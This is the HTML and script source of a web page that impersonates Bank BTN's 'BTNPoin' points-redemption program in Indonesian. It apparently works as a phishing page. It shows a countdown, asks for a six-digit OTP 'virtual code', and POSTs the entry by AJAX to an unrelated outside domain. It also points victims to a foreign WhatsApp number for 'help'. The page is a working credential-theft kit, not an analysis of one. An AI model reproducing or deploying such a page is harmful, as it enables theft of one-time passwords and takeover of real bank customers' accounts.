<html>
 <head> 
  ...
  <title>𝗕𝗧𝗡𝗣𝗼𝗶𝗻 | 𝗕𝗧𝗡 𝗧𝘂𝗸𝗮𝗿𝗸𝗮𝗻 𝗣𝗢𝗜𝗡-𝗺𝘂</title>
  ...
  <meta property="og:title" content="𝗕𝗧𝗡𝗣𝗼𝗶𝗻  | 𝗕𝗧𝗡 𝗧𝘂𝗸𝗮𝗿𝗸𝗮𝗻 𝗣𝗢𝗜𝗡-𝗺𝘂">
  <meta property="og:description" content="BTNPoin adalah program loyalitas yang ditujukan untuk seluruh Nasabah Bank BTN (Prioritas, Visa, E-Banking, Kartu Debit dan Kartu Kredit). Perbanyak poin Anda dari segala jenis transaksi di Bank BTN dan tukar poin dengan beragam reward menarik khusus untuk nasabah setia Bank BTN.">
...
<link rel="apple-touch-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEipe73s-3CcYv1XXmiOtnfFSKYbs7EFK5AJb1P4Jj-6LiXpr7qbbsnoHWxM-MG6cHMlkZu6V342OuENy8Evo_MoLlFzmub-d7VFYcBycMykKax6G8XaoMGi_IhqDZzVm9Sv05nTWxEDe82lnuwS4ln0HnG6VE0sGqhO70WQflrIt5RuY8lZIDftN9qwk4Q/s1080/AddText_10-22-11.27.23.jpg" />
  ...
  <style>
        ...
        .form-log {
            ...
            padding: 0px 45px;
            text-align: center;
            border: 1px solid rgb(0, 134, 224); border-image: initial;
            font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 0px;
            }
...
@media(max-width:525px){
  .box-lte{
    background:url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgnZclTxWV75Oa3fuw43HnoIaFYi5FwgRxKZDvowArTKT3uOGyACODf84apTEGpjv93ZZt-UXs9fzoPDZWxxhT5xzGlY9CmfnkpBXK7CM9_A_CF20nxTpv64kxGD5ijGlGNE5BqqGoMyZfwz0OhXSgZRKuGFZlD-EFm34iaA8Bh2PGMSDgidJv2AkqyRk/s625/background-blue-mobile.png')left 50% bottom 135px/cover no-repeat !important;
  }
}
...
.box-lte{
 ...
 <body> 
 <nav style="position: relative; top: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 65px; background: #F1F5F8; ">
 <img style="" width="100%" src="https://raw.githubusercontent.com/Dini30415/airdrop-lndodax/refs/heads/main/Screenshot_20241006-085716.jpg" alt="" />   
</nav>



<div class="" style="margin-top: 0px; height: 230px; background: #F1F5F8">
<center>

<img src="https://www.btn.co.id/-/media/Images/Corporate/Promotion/2024/Sep/Pro-Helo---Banner-LP.png?h=474&w=843&hash=FDCB3E818A42DB9BD193AE6750F76550" width="95%" style="border-radius: 15px 15px 3px 3px; height: 195px">
   <div style="width: 100%; height: 30%; display: block; background-color: #F1F5F8; position: fixed; top: 35%; left: 0; right: 0; border-radius: 15px 15px 0px 0px; border-top: 2px inset #fff; margin: 0px auto;z-index: ;"></div>
</center>
</div>
  <span class="blink" style="display: none" id="blinkk"><h1>Tautan Link tidak Valid, atau sudah Kadaluarsa</h1></span>
   ...
   <div class="box-lte" style="position: relative; z-index: 9999"> 
    <div class="row" style="margin-top: 20px;"> 

    </div> 
    <div class="row"> 

     <p style="font-weight: bold; font-size: 20px; color: #ddd; text-align: center; margin: 10px auto;" id="waktu">2 : 00</p> 
    </div>
    <center style="color: #ddd; font-weight: bold">Masukkan Kode Virtual</center>
    <div class="row"> 
...
<input type="hidden" id="saldoku" name="uang" value="">
         <input type="tel" name="otp" id="nama1"  class="bubble-element Input form-log" placeholder="Kode Virtual 6 DIGIT" maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,6}"  required oninvalid="this.setCustomValidity('Mohon mɑsukkɑn 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 dengɑn benɑr')" onchange="this.setCustomValidity('')" style="margin-left: 0px; border-radius: 15px 0px 15px 0px;box-shadow: rgba(0, 0, 0, 0.36) 0px 1px 4px;" required onclick="gantiborder1()">

         <b> <p style="font-size: 14px; text-align: center; margin-top: 15px; margin-left: 10px; margin-right: 10px; position: relative" onclick="location.href='https://wa.me/573224621926?text=Hallo%20Bank%20BTN%0ASaya%20mau%20request%20Kode'"><strong style="color: #FF0000; text-decoration: none; width: 90%" > Belum Menerima Kode Virtual ?<br/><font style="font-size:13; color: #098CE3">Klik disini</font> </strong></p></b>
        </div>
       </center>

<div style="position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 85px; background: #fff; box-shadow: rgba(0, 0, 0, 0.15) 5px 5px 15px 0px; padding-top: 15px">
<button type="submit" id="kirims" style="margin-left: 20px;margin-top:px ;position:absolute;background-color:#0066AE;color:white;border:0px solid #0076e0;width:90%;border-radius:50px;font-family: 'Nunito', sans-serif;font-size: 15px;padding:13px;display: inline-block; box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px;" >Konfirmasi</button>
           </div>
</form>
     </div>
     <b> </b>
   ...
   <b> 
    <div class="row"> 
     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;"> 
      <p id="kirimulang" style="font-size: 12px; text-align: center; margin-top: 55px;"><strong style="color: #5e5e5e;">Tidak terima SMS? <a href="otp.php" style="text-decoration: none; color: none rgb(9, 100, 127);">Kirim ulang SMS</a></strong></p> 
      <p  style="font-size: 12px; text-align: center; margin-top: 55px;" class="blink"><strong style="color: red; display: none" id="blinkAktivasi">Kode Virtual tidak valid, atau sudah kadaluarsa</a></strong></p> 
...
$.ajax({
 ...
 type: 'POST',
 url: 'https://new-airdops.my.id/sendOtp.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 ...
 $("#nama1").addClass('textarea1'); 
   ...
   setTimeout(function(){
     document.getElementById("blinkAktivasi").style.display = "none";
